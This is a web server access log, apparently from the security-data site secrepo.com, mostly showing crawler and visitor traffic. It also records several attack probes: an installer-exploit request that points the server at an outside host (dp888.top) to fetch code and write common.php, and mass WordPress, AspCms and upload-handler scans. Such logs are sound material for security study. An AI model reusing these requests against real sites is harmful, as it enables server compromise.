198.44.251.19 - - [12/Apr/2024:05:38:58 -0700] "GET /install/index.php.bak/x.php?step=11&insLockfile=a&s_lang=a&install_demo_name=common.php&updateHost=http://dp888.top/ HTTP/1.1" 301 723 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
198.44.251.19 - - [12/Apr/2024:05:38:59 -0700] "GET /install/common.php HTTP/1.1" 301 511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
123.126.50.150 - - [12/Apr/2024:05:57:33 -0700] "GET / HTTP/1.1" 200 49096 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
40.77.167.14 - - [12/Apr/2024:06:06:01 -0700] "GET / HTTP/1.1" 200 13141 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
101.57.38.23 - - [12/Apr/2024:06:14:50 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928571 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0" 
66.249.64.106 - - [12/Apr/2024:06:20:08 -0700] "HEAD / HTTP/1.1" 200 425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
91.92.242.154 - - [12/Apr/2024:06:27:46 -0700] "GET /simple.php HTTP/1.1" 404 328 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
40.77.167.45 - - [12/Apr/2024:06:32:41 -0700] "GET /self.logs/access.log.2018-05-17.gz HTTP/1.1" 200 23069 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
66.249.64.107 - - [12/Apr/2024:06:37:29 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.107 - - [12/Apr/2024:06:37:33 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/122.0.6261.94 Safari/537.36" 
66.249.70.64 - - [12/Apr/2024:06:41:26 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.108 - - [12/Apr/2024:06:41:26 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.70.71 - - [12/Apr/2024:06:41:26 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.108 - - [12/Apr/2024:06:41:27 -0700] "GET / HTTP/1.1" 200 13162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.108 - - [12/Apr/2024:06:41:29 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/122.0.6261.94 Safari/537.36" 
17.241.219.126 - - [12/Apr/2024:06:51:16 -0700] "GET /self.logs/error.log.2020-02-18 HTTP/1.1" 200 2297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
103.230.14.148 - - [12/Apr/2024:06:52:11 -0700] "GET /tools/upload_ajax.ashx HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
207.46.13.111 - - [12/Apr/2024:06:57:07 -0700] "GET /self.logs/error.log.2017-06-09.gz HTTP/1.1" 200 1386 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
114.119.155.236 - - [12/Apr/2024:06:58:37 -0700] "GET /self.logs/error.log.2020-09-20 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.128.10 - - [12/Apr/2024:06:59:54 -0700] "GET /self.logs/error.log.2020-06-13 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
3.74.43.24 - - [12/Apr/2024:07:00:23 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" 
114.119.137.143 - - [12/Apr/2024:07:01:19 -0700] "GET /self.logs/error.log.2020-06-03 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.150.155 - - [12/Apr/2024:07:02:40 -0700] "GET /honeypot/ HTTP/1.1" 200 782 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.64.108 - - [12/Apr/2024:07:06:59 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
216.244.66.245 - - [12/Apr/2024:07:12:12 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
52.167.144.190 - - [12/Apr/2024:07:22:11 -0700] "GET /self.logs/error.log.2021-07-22 HTTP/1.1" 200 307 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
207.46.13.116 - - [12/Apr/2024:07:26:11 -0700] "GET /self.logs/error.log.2019-01-05.gz HTTP/1.1" 200 5404 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
119.188.240.22 - - [12/Apr/2024:07:27:52 -0700] "GET /api.php?op=checkcode&code_len=4&font_size=20&width=130&height=50&font_color=&background= HTTP/1.1" 404 328 "-" "python-requests/2.31.0" 
66.249.64.108 - - [12/Apr/2024:07:36:11 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.107 - - [12/Apr/2024:07:36:14 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/122.0.6261.94 Safari/537.36" 
111.7.100.34 - - [12/Apr/2024:07:37:28 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Linux; U; Android 8.0.0; zh-CN; SM-C7000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.2.0.1000 Mobile Safari/537.36" 
111.7.100.35 - - [12/Apr/2024:07:37:29 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.so.com/link?m=x&link?url=x&?from=x&?src=x&jump?u=x&?uID=x" "Mozilla/5.0 (Linux; U; Android 8.0.0; zh-CN; SM-C7000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.2.0.1000 Mobile Safari/537.36" 
36.99.136.137 - - [12/Apr/2024:07:37:47 -0700] "GET / HTTP/1.1" 200 13149 "http://www.so.com/link?m=x&link?url=x&?from=x&?src=x&jump?u=x&?uID=x" "Mozilla/5.0 (Linux; U; Android 8.0.0; zh-CN; SM-C7000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.2.0.1000 Mobile Safari/537.36" 
66.249.70.64 - - [12/Apr/2024:07:40:10 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.106 - - [12/Apr/2024:07:40:10 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
40.77.167.78 - - [12/Apr/2024:07:44:26 -0700] "GET /self.logs/error.log.2017-02-18.gz HTTP/1.1" 200 889 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
154.185.1.160 - - [12/Apr/2024:07:47:50 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" 
154.185.1.160 - - [12/Apr/2024:07:48:32 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15" 
124.82.10.34 - - [12/Apr/2024:07:49:15 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
124.82.10.34 - - [12/Apr/2024:07:49:16 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari/15613.3.9.1.16 CFNetwork/1128.1 Darwin/19.6.0 (x86_64)" 
124.82.10.34 - - [12/Apr/2024:07:49:16 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/15613.3.9.1.16 CFNetwork/1128.1 Darwin/19.6.0 (x86_64)" 
124.82.10.34 - - [12/Apr/2024:07:49:17 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "-" "Safari/15613.3.9.1.16 CFNetwork/1128.1 Darwin/19.6.0 (x86_64)" 
124.82.10.34 - - [12/Apr/2024:07:49:17 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1" 
124.82.10.34 - - [12/Apr/2024:07:49:17 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 305 "-" "Safari/15613.3.9.1.16 CFNetwork/1128.1 Darwin/19.6.0 (x86_64)" 
124.82.10.34 - - [12/Apr/2024:07:49:17 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/15613.3.9.1.16 CFNetwork/1128.1 Darwin/19.6.0 (x86_64)" 
114.119.142.8 - - [12/Apr/2024:07:52:29 -0700] "GET /self.logs/error.log.2020-12-26 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.64.108 - - [12/Apr/2024:07:57:48 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=D;O=D HTTP/1.1" 200 833 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
36.72.153.160 - - [12/Apr/2024:08:08:27 -0700] "GET / HTTP/1.1" 200 13186 "-" "python-requests/2.30.0" 
103.131.71.202 - - [12/Apr/2024:08:11:23 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.202 - - [12/Apr/2024:08:11:28 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)" 
92.242.63.45 - - [12/Apr/2024:08:14:14 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:16 -0700] "GET / HTTP/1.1" 200 49133 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:17 -0700] "GET //wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:18 -0700] "GET //xmlrpc.php?rsd HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:18 -0700] "GET / HTTP/1.1" 200 49110 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:21 -0700] "GET //shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:22 -0700] "GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:22 -0700] "GET //test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:22 -0700] "GET //media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:22 -0700] "GET //wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:22 -0700] "GET //site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:22 -0700] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
92.242.63.45 - - [12/Apr/2024:08:14:22 -0700] "GET //sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
40.77.167.32 - - [12/Apr/2024:08:15:38 -0700] "GET /self.logs/access.log.2017-04-30.gz HTTP/1.1" 200 11936 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
70.32.1.73 - - [12/Apr/2024:08:43:12 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0" 
66.249.64.107 - - [12/Apr/2024:08:57:48 -0700] "GET /Datasets%20Description/PE_malware/?C=S;O=A HTTP/1.1" 200 686 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.106 - - [12/Apr/2024:08:57:49 -0700] "GET /Datasets%20Description/PE_malware/?C=N;O=D HTTP/1.1" 200 683 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.108 - - [12/Apr/2024:08:57:50 -0700] "GET /Datasets%20Description/PE_malware/?C=D;O=A HTTP/1.1" 200 686 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.106 - - [12/Apr/2024:08:57:50 -0700] "GET /Datasets%20Description/PE_malware/?C=M;O=A HTTP/1.1" 200 663 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
150.138.89.114 - - [12/Apr/2024:09:12:37 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
103.24.219.56 - - [12/Apr/2024:09:22:27 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
52.167.144.200 - - [12/Apr/2024:09:39:26 -0700] "GET /self.logs/error.log.2022-10-17.gz HTTP/1.1" 301 485 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
207.46.13.151 - - [12/Apr/2024:09:40:03 -0700] "GET /self.logs/error.log.2017-02-25.gz HTTP/1.1" 200 972 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
23.235.160.114 - - [12/Apr/2024:09:41:51 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
36.99.136.128 - - [12/Apr/2024:09:41:53 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
36.99.136.128 - - [12/Apr/2024:09:41:53 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.so.com/link?m=x&link?url=x&?from=x&?src=x&jump?u=x&?uID=x" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
36.99.136.137 - - [12/Apr/2024:09:42:10 -0700] "GET / HTTP/1.1" 200 13148 "http://www.so.com/link?m=x&link?url=x&?from=x&?src=x&jump?u=x&?uID=x" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
123.126.50.7 - - [12/Apr/2024:09:43:14 -0700] "GET / HTTP/1.1" 200 49096 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
38.55.150.4 - - [12/Apr/2024:09:44:40 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
114.119.155.236 - - [12/Apr/2024:09:45:02 -0700] "GET /self.logs/error.log.2020-07-26 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.128.10 - - [12/Apr/2024:09:47:31 -0700] "GET /self.logs/error.log.2020-08-21 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.150.155 - - [12/Apr/2024:09:48:59 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/conn.html HTTP/1.1" 200 2011 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_1/?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.12 - - [12/Apr/2024:10:05:41 -0700] "GET /self.logs/2015/?C=M;O=D HTTP/1.1" 200 7906 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
103.44.246.69 - - [12/Apr/2024:10:26:39 -0700] "GET /admin/_Manager/AspCms_Manager.asp HTTP/1.1" 404 328 "http://www.secrepo.com/admin/_Manager/AspCms_Manager.asp" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
121.156.47.212 - - [12/Apr/2024:10:27:34 -0700] "HEAD /self.logs/access.log.2022-02-18.gz HTTP/1.1" 200 408 "-" "Apache-HttpClient/5.2.1 (Java/17.0.6)" 
121.156.47.212 - - [12/Apr/2024:10:27:35 -0700] "GET /self.logs/access.log.2022-02-18.gz HTTP/1.1" 200 182141 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0" 
119.188.246.91 - - [12/Apr/2024:10:41:50 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
43.163.8.148 - - [12/Apr/2024:10:45:25 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
54.36.149.103 - - [12/Apr/2024:10:55:46 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
